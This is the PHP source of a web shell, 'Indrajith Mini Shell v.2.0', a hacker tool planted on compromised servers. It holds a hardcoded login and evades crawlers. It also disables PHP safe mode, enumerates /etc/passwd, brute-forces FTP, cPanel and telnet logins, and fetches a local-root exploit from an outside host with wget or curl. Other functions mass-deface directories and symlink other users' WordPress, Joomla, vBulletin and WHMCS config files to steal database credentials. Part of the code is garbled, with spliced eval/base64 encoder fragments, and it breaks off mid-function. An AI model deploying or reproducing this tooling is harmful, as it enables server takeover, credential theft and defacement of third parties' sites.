<?php

/*
 * Indrajith Mini Shell v.2.0 with additional features....
 * originally scripted by AJITH KP
 * (c) Under Gnu General Public Licence 3(c)
 * Team Open Fire and Indishell Family
 * TOF : Shritam Bhowmick, Null | Void, Alex, Ankit Sharma,John.
 * Indishell : ASHELL, D@rkwolf.
 * THA : THA RUDE [There is Nothing in Borders]
 * Love to : AMSTECK ARTS & SCIENCE COLLEGE, Kalliassery; Vishnu Nath KP, Sreeju, Sooraj, Komputer Korner Friends.
 */

/*------------------ LOGIN -------------------*/

$username="ajithkp560";
$password="ajithkp560";
$email="ajithkp560@gmail.com";


/*------------------ Login Data End ----------*/

@error_reporting(4);

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />"; //For Ensuring... Fuck all Robots...
/*------------------ End of Anti Crawler -----*/



    echo "<link href=data:image/gif;base64,R0lGODlhEAAQAPcAADGcADmcADmcCEKcEEKlEEqlGEqlIVKlIVKtIVKtKVqtMWO1OWu1Qmu1SnO1SnO9SnO9Unu9WoS9Y4TGY4zGa4zGc5TGc5TOc5TOe5zOe5zOhK3WlLXepb3ercbntcbnvc7nvc7nxtbvzt7vzt7v1uf33u/35+/37/f37/f/9///9////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ywAAAAAEAAQAAAIxwA7ABhIsGBBgQEAJAwwgIGEBQojEhQwcIEFDRUUUCS4UCEEjAc2RhQJoIGGCAIERODQQOLAAAc0SABwgEMIDgoSShQgAcMAAx08OBCgEYDImA0CbPiwoICHFBIoDogAwAGGAgpCVBggYgUHAwU2nFgBQEIFARVAGNCwAkNVEytCzKwwc0MHASVICHCQ4gTKgRJaVtAgQAQGBSdMJCDZ0WiADyoYAOCg4eVAkQpWCBRgIoTOjTotrHAwECwAgZYpdkBRQGKHgAAAOw== rel=icon type=image/x-icon />";
    echo "<style>
    html { background:url(http://www.ajithkp560.hostei.com/images/background.gif) black; }
    #loginbox { font-size:11px; color:green; width:1200px; height:200px; border:1px solid #4C83AF; background-color:#111111; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
    input { font-size:11px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; }
    loginbox td { border-radius:5px; font-size:11px; }
    .header { size:25px; color:green; }
    h1 { font-family:DigifaceWide; color:green; font-size:200%; }
    h1:hover { text-shadow:0 0 20px #00FFFF, 0 0 100px #00FFFF; }
    .go { height: 50px; width: 50px;float: left; margin-right: 10px; display: none; background-color: #090;}
    .input_big { width:75px; height:30px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; font-size:17px; }
    hr { border:1px solid #222222; }
    #meunlist { width: auto; height: auto; font-size: 12px; font-weight: bold; }
    #meunlist ul { padding-top: 5px; padding-right: 5px; padding-bottom: 7px; padding-left: 2px; text-align:center; list-style-type: none; margin: 0px; }
    #meunlist li { margin: 0px; padding: 0px; display: inline; }
    #meunlist a { font-size: 14px; text-decoration:none; font-weight: bold;color:green;clear: both;width: 100px;margin-right: -6px; padding-top: 3px; padding-right: 15px; padding-bottom: 3px; padding-left: 15px; }
    #meunlist a:hover { background: #333; color:green; }
    .menubar {-moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0;  }
    .menu { font-size:25px; color: }
    .textarea_edit { background-color:#111111; border:1px groove #333; color:green; }
    .textarea_edit:hover { text-decoration:none; border:1px dashed #333; }
    .input_butt {font-size:11px; background:#191919; color:#4C83AF; margin:0 4px; border:1px solid #222222;}
    #result{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px;}
    .table{ width:100%; padding:4px 0; color:#888; font-size:15px; }
    .table a{ text-decoration:none; color:green; font-size:15px; }
    .table a:hover{text-decoration:underline;}
    .table td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px; vertical-align:top; }
    .table th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; }
    .table tr:hover{ background:#181818; }
    .tbl{ width:100%; padding:4px 0; color:#888; font-size:15px; text-align:center;  }
    .tbl a{ text-decoration:none; color:green; font-size:15px; vertical-align:middle; }
    .tbl a:hover{text-decoration:underline;}
    .tbl td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px;  vertical-align:middle; width: 300px; }
    .tbl th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; vertical-align:middle; }
    .tbl td:hover{ background:#181818; }
    #alert {position: relative;}
    #alert:hover:after {background: hsla(0,0%,0%,.8);border-radius: 3px;color: #f6f6f6;content: 'Click to dismiss';font: bold 12px/30px sans-serif;height: 30px;left: 50%;margin-left: -60px;position: absolute;text-align: center;top: 50px; width: 120px;}
    #alert:hover:before {border-bottom: 10px solid hsla(0,0%,0%,.8);border-left: 10px solid transparent;border-right: 10px solid transparent;content: '';height: 0;left: 50%;margin-left: -10px;position: absolute;top: 40px;width: 0;}
    #alert:target {display: none;}
    .alert_red {animation: alert 1s ease forwards;background-color: #c4453c;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -5px;width: 100%;}
    .alert_green {animation: alert 1s ease forwards;background-color: #43CD80;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -5px;width: 100%;}
    @keyframes alert {0% { opacity: 0; }50% { opacity: 1; }100% { top: 0; }}
    </style>";
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        if($_POST["usrname"]==$username && $_POST["passwrd"]==$password)
        {
            print'<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
            if($email!="")
            {
                mail_alert();
            }
        }
        else
        {
            if($_POST['usrname'])
            {
                print'<script>alert("Sorry... Wrong UserName/PassWord");</script>';
            }
            echo '<title>INDRAJITH SHELL v.2.0</title><center>
            <div id=loginbox><p><font face="verdana,arial" size=-1>
            <font color=orange>>>>>>>>>>></font><font color=white>>>>>><<<<<</font><font color=green>>>>>>>>>>></font>
            <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>INDRAJITH SHELL v.2.0</b></font></th></tr>
            <tr><td bgcolor="black" style="padding:5">
            <form method="post">
            <input type="hidden" name="action" value="login">
            <input type="hidden" name="hide" value="">
            <center><table>
            <tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" value="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
            <tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="passwrd" value="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
            <tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Enter"></font></td></tr></table>
            </div><br /></center>';
            exit;
        }
    }

$color_g="green";
$color_b="4C83AF";
$color_bg="#111111";
$color_hr="#222";
$color_wri="green";
$color_rea="yellow";
$color_non="red";
$path=$_GET['path'];

@session_start();
@set_time_limit(0);
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("safe_mode");
@ini_restore("open_basedir");
@ignore_user_abort(FALSE);
@ini_set('zlib.output_compression','Off');
$safemode=@ini_get('safe_mode');

$sep="/";
if(strtolower(substr(PHP_OS,0,3))=="win")
{
    $os="win";
    $sep="\\";
    $ox="Windows";
}
else
{
    $os="nix";
    $ox="Linux";
}



$self=$_SERVER['PHP_SELF'];
$srvr_sof=$_SERVER['SERVER_SOFTWARE'];
$your_ip=$_SERVER['REMOTE_ADDR'];
$srvr_ip=$_SERVER['SERVER_ADDR'];
$admin=$_SERVER['SERVER_ADMIN'];

$s_php_ini="safe_mode=OFF
disable_functions=NONE";

$ini_php="<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?><?php, ?><?php /* Encoded in INDRAJITH SHELL PROJECT */ eval(gzinflate(base64_decode(\"$res_t\"))); ?><?php, ?><?php /* Encoded in INDRAJITH SHELL PROJECT */ eval(gzuncompress(base64_decode(\"$res_t\"))); ?><?php, ?><?php /* Encoded in INDRAJITH SHELL PROJECT */ eval(str_rot13(base64_decode(\"$res_t\"))); ?><?php 
				if($os != "win")
				{
					if(@file('/etc/passwd'))
					{
						$users = file('/etc/passwd');
						foreach($users as $user) 
						{
							$user = explode(':', $user);
							echo $user[0] . "\n";
						}
					}
					else
					{
						$temp = "";
						$val1 = 0;
						$val2 = 1000;
						for(;$val1 <= $val2;$val1++) 
						{
							$uid = @posix_getpwuid($val1);
							if ($uid)
								 $temp .= join(':',$uid)."\n";
						 }
						
						 $temp = trim($temp);
							 
						 if($file5 = fopen("test.txt","w"))
						 {
							fputs($file5,$temp);
							 fclose($file5);
							 
							 $file = fopen("test.txt", "r");
							 while(!feof($file))
							 {
							 	$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/","",$matches[1]);
								if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo $matches;
							}
							fclose($file);
						}
					}
				}
				 ?><?php
		}
		else
		{
			if(empty($_POST['username']) || empty($_POST['password']))
				echo "<center>Please Enter The Users or Password List</center>";
			else
			{
				$userlist=explode("\n",$_POST['username']);
				$passlist=explode("\n",$_POST['password']);
	
				if($_POST['cracktype'] == "ftp")
				{
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							ftp_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
				if ($_POST['cracktype'] == "cpanel" || $_POST['cracktype'] == "telnet")
				{
					if($cracktype == "telnet")
					{
						$cpanel_port="23";
					}
					else
						$cpanel_port="2082";
					foreach ($userlist as $user)
					{
						$pureuser = trim($user);
						echo "<b><font face=Tahoma style=\"font-size: 9pt\" color=#008000> [ - ] </font><font face=Tahoma style=\"font-size: 9pt\" color=#FF0800>
						Processing user $pureuser ...</font></b><br><br>";
						foreach ($passlist as $password )
						{
							$purepass = trim($password);
							cpanel_check($_POST['target'],$pureuser,$purepass,$connect_timeout);
						}
					}
				}
			}
		}
                
    echo "</div>";
}

function get_users()
{
    $userz = array();
    $user = file("/etc/passwd");
    foreach($user as $userx=>$usersz)
    {
            $userct = explode(":",$usersz);
            array_push($userz,$userct[0]);
    }
    if(!$user)
    {
        if($opd = opendir("/home/"))
        {
            while(($file = readdir($opd))!== false)
            {
                array_push($userz,$file);
            }
        }
        closedir($opd);
    }
    $userz=implode(', ',$userz);
    return $userz;
}

function exploit_details()
{
    global $os;
    echo "<div id=result style='color:green;'><center>
    <h2>Exploit Server Details</h2><hr /><br /><br /><table class=table style='color:green;text-align:center'><tr><td>
    OS: <a style='color:7171C6;text-decoration:none;' target=_blank href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".php_uname(s)."'>".php_uname(s)."</td></tr>
    <tr><td>PHP Version : <a style='color:7171C6;text-decoration:none;' target=_blank href='?phpinfo'>".phpversion().".</td></tr>
    <tr><td>Kernel Release : <font color=7171C6>".php_uname(r)."</font></td></tr>
    <tr><td>Kernel Version : <font color=7171C6>".php_uname(v)."</font></td></td>
    <tr><td>Machine : <font color=7171C6>".php_uname(m)."</font></td</tr>
    <tr><td>Server Software : <font color=7171C6>".$_SERVER['SERVER_SOFTWARE']."</font></td</tr><tr>";
    if(function_exists('apache_get_modules'))
    {
	echo "<tr><td style='text-align:left;'>Loaded Apache modules : <br /><br /><font color=7171C6>";
        echo implode(', ', apache_get_modules());
        echo "</font></tr></td>";
    }
    if($os=='win')
    {
        echo  "<tr><td style='text-align:left;'>Account Setting : <font color=7171C6><pre>".cmd('net accounts')."</pre></td></tr>
               <tr><td style='text-align:left'>User Accounts : <font color=7171C6><pre>".cmd('net user')."</pre></td></tr>
               ";
    }
    if($os=='nix')
    {
        echo "<tr><td style='text-align:left'>Distro : <font color=7171C6><pre>".cmd('cat /etc/*-release')."</pre></font></td></tr>
              <tr><td style='text-align:left'>Distr name : <font color=7171C6><pre>".cmd('cat /etc/issue.net')."</pre></font></td></tr>
              <tr><td style='text-align:left'>GCC : <font color=7171C6><pre>".cmd('whereis gcc')."</pre></td></tr>
              <tr><td style='text-align:left'>PERL : <font color=7171C6><pre>".cmd('whereis perl')."</pre></td></tr>
              <tr><td style='text-align:left'>PYTHON : <font color=7171C6><pre>".cmd('whereis python')."</pre></td></tr>
              <tr><td style='text-align:left'>JAVA : <font color=7171C6><pre>".cmd('whereis java')."</pre></td></tr>
              <tr><td style='text-align:left'>APACHE : <font color=7171C6><pre>".cmd('whereis apache')."</pre></td></tr>
              <tr><td style='text-align:left;'>CPU : <br /><br /><pre><font color=7171C6>".cmd('cat /proc/cpuinfo')."</font></pre></td></tr>
              <tr><td style='text-align:left'>RAM : <font color=7171C6><pre>".cmd('free -m')."</pre></td></tr>
              <tr><td style='text-align:left'> User Limits : <br /><br /><font color=7171C6><pre>".cmd('ulimit -a')."</pre></td></tr>";
              $useful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
              $uze=array();
              foreach($useful as $uzeful)
              {
                if(cmd("which $uzeful"))
                {
                    $uze[]=$uzeful;
                }
              }
              echo "<tr><td style='text-align:left'>Useful : <br /><font color=7171C6><pre>";
              echo implode(', ',$uze);
              echo "</pre></td></tr>";
              $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
              $uze=array();
              foreach($downloaders as $downloader)
              {
                if(cmd("which $downloader"))
                {
                    $uze[]=$downloader;
                }
              }
              echo "<tr><td style='text-align:left'>Downloaders : <br /><font color=7171C6><pre>";
              echo implode(', ',$uze);
              echo "</pre></td></tr>";
              echo "<tr><td style='text-align:left'>Users : <br /><font color=7171C6><pre>".wordwrap(get_users())."</pre</font>></td></tr>
                    <tr><td style='text-align:left'>Hosts : <br /><font color=7171C6><pre>".cmd('cat /etc/hosts')."</pre></font></td></tr>";
    }
    echo "</table><br /><br /><hr /><br /><br />";
}

function remote_file_check_ui()
{
    echo "<div id=result><center><h2>Remote File Check</h2><hr /><br /><br />
          <table class=tbl><form method='POST'><tr><td>URL : <input size=50 name='rem_web' value='http://www.ajithkp560.hostei.com/php/'></td></tr>
          <tr><td><font color=red>Input File's Names in TextArea</font></tr></td><tr><td><textarea spellcheck='false' class='textarea_edit' cols=50 rows=30 name='tryzzz'>indrajith.php
ajithkp560.php
index.html
profile.php
c99.php
r57.php</textarea></td></tr>
         <tr><td><br /><input type='submit' value='   >>   ' class='input_big' /><br /><br /></td></tr></form></table><br /><br /><hr /><br /><br />";
}

function remote_file_check_bg()
{
    set_time_limit(0);
    $rtr=array();
    echo "<div id=result><center><h2>Scanner Report</h2><hr /><br /><br /><table class=tbl>";
    $webz=$_POST['rem_web'];
    $uri_in=$_POST['tryzzz'];
    $r_xuri = trim($uri_in);
    $r_xuri=explode("\n", $r_xuri);
    foreach($r_xuri as $rty)
    {
        $urlzzx=$webz.$rty;
        if(function_exists('curl_init'))
        {
            echo "<tr><td style='text-align:left'><font color=orange>Checking : </font> <font color=7171C6> $urlzzx </font></td>";
            $ch = curl_init($urlzzx);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_exec($ch);
            $status_code=curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            if($status_code==200)
            {
                echo "<td style='text-align:left'><font color=green> Found....</font></td></tr>";
            }
            else
            {
                echo "<td style='text-align:left'><font color=red>Not Found...</font></td></tr>";
            }
        }
        else
        {
            echo "<font color=red>cURL Not Found </font>";
            break;
        }
    }
    echo "</table><br /><br /><hr /><br /><br /></div>";
}

function remote_download_ui()
{
    echo "<div id=result><center><h2>Remote File Download</h2><hr /><br /><br /><table class=tbl><form method='GET'><input type=hidden name='path' value=".getcwd()."><tr><td><select style='color:green; background-color:black; border:1px solid #666;' name='type_r_down'><option>WGET</option><option>cURL</option></select></td></tr>
    <tr><td>URL <input size=50 name='rurlfile' value='ajithkp560.hostei.com/localroot/2.6.x/h00lyshit.zip'></td></tr>
    <tr><td><input type='submit' class='input_big' value='   >>   ' /></td></tr></form></table><br /><br /><hr /><br /><br /></div>";
}

function remote_download_bg()
{
    chdir($_GET['path']);
    global $os;
    $opt=$_GET['type_r_down'];
    $rt_ffile=$_GET['rurlfile'];
    $name=basename($rt_ffile);
    echo "<div id=result>";
    switch($opt)
    {
        case "WGET":
            if($os!='win')
            {
                cmd("wget $rt_ffile");
                alert("Downloaded Successfully...");
            }
            else
            {
                alert("Its Windows OS... WGET is not available");
            }
            break;
        case "cURL":
            if(function_exists('curl_init'))
            {
                $ch = curl_init($rt_ffile);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $data = curl_exec($ch);
                curl_close($ch);
                file_put_contents($name, $data);
                alert("Download succeeded");
            }
            else
            {
                alert("cURL Not Available");
            }
            break;
    }
    echo "</div>";
}

function hex_encode_ui()
{
    if(isset($_REQUEST['hexinp']) && isset($_REQUEST['tyxxx']))
    {
        $tyx=$_POST['tyxxx'];
        $rezultzz=$_POST['hexinp'];
        switch($tyx)
        {
            case "Encode":
                $rzul=PREG_REPLACE("'(.)'e","dechex(ord('\\1'))",$rezultzz);
                echo "<div id=result><center><h2>HEXADECIMAL ENCODER</h2><hr /><br /><br />
                <textarea class='textarea_edit' spellcheck=false cols=60 rows=10>$rzul</textarea>
                <br /><br /><form method='POST'><select style='color:green; background-color:black; border:1px solid #666;' name='tyxxx'><option>Encode</option><option>Decode</option></select>
                Input : <input name='hexinp' size=50 value='input here'><input type=submit value='   >>  ' /><br /><br /><hr /><br /><br /></div>";
                break;
            case "Decode":
                $rzul=PREG_REPLACE("'([\S,\d]{2})'e","chr(hexdec('\\1'))",$rezultzz);
                echo "<div id=result><center><h2>HEXADECIMAL ENCODER</h2><hr /><br /><br />
                <textarea class='textarea_edit' spellcheck=false cols=60 rows=10>$rzul</textarea>
                <br /><br /><form method='POST'><select style='color:green; background-color:black; border:1px solid #666;' name='tyxxx'><option>Encode</option><option>Decode</option></select>
                Input : <input name='hexinp' size=50 value='input here'><input type=submit value='   >>  ' /><br /><br /><hr /><br /><br /></div>";
                break;
        }
    }
    else
    {
        echo "<div id=result><center><h2>HEXADECIMAL ENCODER</h2><hr /><br /><br />
        <textarea class='textarea_edit' spellcheck=false cols=60 rows=10>Here visible Your Result</textarea>
        <br /><br /><form method='POST'><select style='color:green; background-color:black; border:1px solid #666;' name='tyxxx'><option>Encode</option><option>Decode</option></select>
        Input : <input name='hexinp' size=50 value='input here'><input type=submit value='   >>  ' /><br /><br /><hr /><br /><br /></div>";
    }
}

function killme()
{
    global $self;
    echo "<div id=result><center><h2>Good Bye Dear</h2><hr />Dear, Good by... :( Hope You Like me...<br /><br /><br/><hr /><br /><br />";
    $me=basename($self);
    unlink($me);
}

function ftp_anonymous_ui()
{
    echo "<div id='result'><center><h2>Anonymous FTP Scanner</h2><hr /></center><table class=tbl><form method='GET'><tr><td><textarea name='ftp_anonz' cols=40 rows=25 class='textarea_edit'>127.0.0.1
ftp.google.com
ftp.r00t.com
ftp.ajithkp.org
...
...</textarea></td></tr><tr><td><input class='input_big' type='submit' value='   >>   ' /></td></tr></form></table><br /><br /><hr /><br /><br />";
}

function ftp_anonymous_bg()
{
    echo "<div id=result><center><h2>Result</h2></center><hr /><br /><br /><table class=table>";
    $ftp_list=$_GET['ftp_anonz'];
    $xftpl = trim($ftp_list);
    $xftpl = explode("\n", $xftpl);
    foreach($xftpl as $xftp)
    {
        $xftp = str_replace("ftp://", "", $xftp);
        $conn_ftp = ftp_connect($xftp);
        $success = ftp_login($conn_ftp, "anonymous", "");
        if($success)
        {
            echo "<tr><td><font color=7171C6>$xftp</font></td><td><font color=green>Successfull</font></td></tr>";
        }
        else
        {
            echo "<tr><td><font color=7171C6>$xftp</font></td><td><font color=red>Failed</font></td></tr>";
        }
        
    }
    echo "</table><br /><br /><hr /><br /><br />";
}

function mass_deface_ui()
{
    echo "<div id=result><center><h2>Mass Deface</h2><hr /><br /><br /><table class=tbl><form method='GET'><input name='mm_path' type='hidden' value=".$_GET['path']."><tr><td>Name : <input size=40 name='mass_name'></td></tr>
    <tr><td><textarea name='mass_cont' cols=80 rows=25 class='textarea_edit'></textarea></td></tr><tr><td><input class='input_big' type=submit value='   >>   ' /></td></tr></form></table><br /><br /><hr /><br /><br /></div>";
}

function mass_deface_bg()
{
    global $sep;
    $d_path=$_GET['mm_path'];
    chdir($d_path);
    $d_file=$_GET['mass_name'];
    $d_conten=$_GET['mass_cont'];
    if(is_dir($d_path))
    {
        chdir($d_path);
        $d_dirs=array();
        if($handle=opendir($d_path))
        {
            while(($item=readdir($handle))!==FALSE)
            {
                if($item=="."){continue;}
                if($item==".."){continue;}
                if(is_dir($item))
                {
                    array_push($d_dirs, $item);
                }
            }
        }
    }
    echo "<div id=result><center><h2>Result</h2></center><hr /><br /><br /><table class=tbl>";
    foreach($d_dirs as $d_dir)
    {
        $xd_path=getcwd()."$sep$d_dir$sep$d_file";
        if(is_writable($d_dir))
        {
            $handle=fopen($xd_path, "wb");
            if($handle)
            {
                fwrite($handle, $d_conten);
            }
        }
        echo "<tr><td><font color=green>$xd_path</font></td></tr>";
    }
    echo "</table><br /><br /><hr /><br /><br /></div>";
}


function symlinkg($usernamexx,$domainxx)
{
		symlink('/home/'.$usernamexx.'/public_html/vb/includes/config.php','Indrajith/'.$domainxx.' =>vBulletin1.txt');
		symlink('/home/'.$usernamexx.'/public_html/includes/config.php','Indrajith/'.$domainxx.' =>vBulletin2.txt');
		symlink('/home/'.$usernamexx.'/public_html/forum/includes/config.php','Indrajith/'.$domainxx.' =>vBulletin3.txt');
		symlink('/home/'.$usernamexx.'/public_html/cc/includes/config.php','Indrajith/'.$domainxx.' =>vBulletin4.txt');
		symlink('/home/'.$usernamexx.'/public_html/inc/config.php','Indrajith/'.$domainxx.' =>mybb.txt');
		symlink('/home/'.$usernamexx.'/public_html/config.php','Indrajith/'.$domainxx.' =>Phpbb1.txt');
		symlink('/home/'.$usernamexx.'/public_html/forum/includes/config.php','Indrajith/'.$domainxx.' =>Phpbb2.txt');
		symlink('/home/'.$usernamexx.'/public_html/wp-config.php','Indrajith/'.$domainxx.' =>Wordpress1.txt');
		symlink('/home/'.$usernamexx.'/public_html/blog/wp-config.php','Indrajith/'.$domainxx.' =>Wordpress2.txt');
		symlink('/home/'.$usernamexx.'/public_html/configuration.php','Indrajith/'.$domainxx.' =>Joomla1.txt');
		symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php','Indrajith/'.$domainxx.' =>Joomla2.txt');
		symlink('/home/'.$usernamexx.'/public_html/joomla/configuration.php','Indrajith/'.$domainxx.' =>Joomla3.txt');
		symlink('/home/'.$usernamexx.'/public_html/whm/configuration.php','Indrajith/'.$domainxx.' =>Whm1.txt');
		symlink('/home/'.$usernamexx.'/public_html/whmc/configuration.php','Indrajith/'.$domainxx.' =>Whm2.txt');
		symlink('/home/'.$usernamexx.'/public_html/support/configuration.php','Indrajith/'.$domainxx.' =>Whm3.txt');
		symlink('/home/'.$usernamexx.'/public_html/client/configuration.php','Indrajith/'.$domainxx.' =>Whm4.txt');
		symlink('/home/'.$usernamexx.'/public_html/billings/configuration.php','Indrajith/'.$domainxx.' =>Whm5.txt');
		symlink('/home/'.$usernamexx.'/public_html/billing/configuration.php','Indrajith/'.$domainxx.' =>Whm6.txt');
		symlink('/home/'.$usernamexx.'/public_html/clients/configuration.php','Indrajith/'.$domainxx.' =>Whm7.txt');
		symlink('/home/'.$usernamexx.'/public_html/whmcs/configuration.php','Indrajith/'.$domainxx.' =>Whm8.txt');
		symlink('/home/'.$usernamexx.'/public_html/order/configuration.php','Indrajith/'.$domainxx.' =>Whm9.txt');
		symlink('/home/'.$usernamexx.'/public_html/admin/conf.php','Indrajith/'.$domainxx.' =>5.txt');
		symlink('/home/'.$usernamexx.'/public_html/admin/config.php','Indrajith/'.$domainxx.' =>4.txt');
		symlink('/home/'.$usernamexx.'/public_html/conf_global.php','Indrajith/'.$domainxx.' =>invisio.txt');
		symlink('/home/'.$usernamexx.'/public_html/include/db.php','Indrajith/'.$domainxx.' =>7.txt');
		symlink('/home/'.$usernamexx.'/public_html/connect.php','Indrajith/'.$domainxx.' =>8.txt');
		symlink('/home/'.$usernamexx.'/public_html/mk_conf.php','Indrajith/'.$domainxx.' =>mk-portale1.txt');
		symlink('/home/'.$usernamexx.'/public_html/include/config.php','Indrajith/'.$domainxx.' =>12.txt');
		symlink('/home/'.$usernamexx.'/public_html/settings.php','Indrajith/'.$domainxx.' =>Smf.txt');
		symlink('/home/'.$usernamexx.'/public_html/includes/functions.php','Indrajith/'.$domainxx.' =>phpbb3.txt');
		symlink('/home/'.$usernamexx.'/public_html/include/db.php','Indrajith/'.$domainxx.' =>infinity.txt');
}

function config_grabber_bg()
{
    global $sym_htaccess,$sym_php_ini;
    mkdir('INDRAJITH', 0777);
    symlink("/", "INDRAJITH/root");
    $htaccess=fopen('INDRAJITH/.htaccess', 'wb');
    fwrite($htaccess,$sym_htaccess);
    $php_ini_x=fopen('INDRAJITH/php.ini', 'wb');
    fwrite($php_ini_x, $sym_php_ini);
    $usr=explode("\n",$_POST['user_z_list']);
    foreach($usr as $uzer)
    {
        $u_er=trim($uzer);
        symlinggg($u_er);
    }
    echo "<script>window.open('INDRAJITH/', '_blank');</script>";
    alert('Config Grab compted. Check configs in direcory INDRAJITH');
}

if(isset($_POST['user_z_list']))
{
    config_grabber_bg();
}


function config_grabber_ui()
{
    if(file('/etc/passwd'))
    {
        ?><?php
        $users = file('/etc/passwd');
        foreach($users as $user)
        {
            $user = explode(':', $user);
            echo $user[0]."\n";
        }
        ?><?php
    }
    else
    {
        alert(" File Not Found : /etc/passwd ");
    }
}

function symlinggg($user)
{
    symlink('/home/'.$usernamexx.'/public_html/blog/configuration.php', "INDRAJITH/".$user." =>blog/configuration.php");
    symlink('/home/'.$user.'/public_html/forum/includes/config.php', "INDRAJITH/".$user." =>forum/includes/config.php");
    symlink("/home/".$user."/public_html/wp-config.php", "INDRAJITH/".$user." =>wp-config.php");
    symlink("/home/".$user."/public_html/wordpress/wp-config.php", "INDRAJITH/".$user." =>wordpress/wp-config.php");
    symlink("/home/".$user."/public_html/configuration.php", "INDRAJITH/".$user." =>configuration.php");
    symlink("/home/".$user."/public_html/blog/wp-config.php", "INDRAJITH/".$user." =>blog/wp-config.php");
    symlink("/home/".$user."/public_html/joomla/configuration.php", "INDRAJITH/".$user." =>joomla/configuration.php");
    symlink("/home/".$user."/public_html/vb/includes/config.php", "INDRAJITH/".$user." =>vb/includes/config.php");
    symlink("/home/".$user."/public_html/includes/config.php", "INDRAJITH/".$user." =>includes/config.php");
    symlink("/home/".$user."/public_html/conf_global.php", "INDRAJITH/".$user." =>conf_global.php");
    symlink("/home/".$user."/public_html/inc/config.php", "INDRAJITH/".$user." =>inc/config.php");
    symlink("/home/".$user."/public_html/config.php", "INDRAJITH/".$user." =>config.php");
    symlink("/home/".$user."/public_html/Settings.php", "INDRAJITH/".$user." =>/Settings.php");
    symlink("/home/".$user."/public_html/sites/default/settings.php", "INDRAJITH/".$user." =>sites/default/settings.php");
    symlink("/home/".$user."/public_html/whm/configuration.php", "INDRAJITH/".$user." =>whm/configuration.php");
    symlink("/home/".$user."/public_html/whmcs/configuration.php", "INDRAJITH/".$user." =>whmcs/configuration.php");
    symlink("/home/".$user."/public_html/support/configuration.php", "INDRAJITH/".$user." =>support/configuration.php");
